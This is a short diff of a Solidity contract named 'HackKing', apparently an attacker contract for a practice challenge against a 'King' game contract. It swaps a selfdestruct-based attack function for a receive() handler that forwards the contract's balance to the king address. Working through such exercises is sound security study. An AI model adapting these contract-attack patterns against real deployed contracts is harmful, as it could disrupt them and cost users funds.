@@ -10,10 +10,7 @@ contract HackKing {
         kingAddress = payable(_kingAddress);
     }
 
-    function breakKing() public {
-        require(kingAddress.balance < address(this).balance);
-        selfdestruct(kingAddress);
+    receive() external payable {
+        kingAddress.call{value: (address(this).balance)}("");
     }
-
-    receive() external payable {}
 }
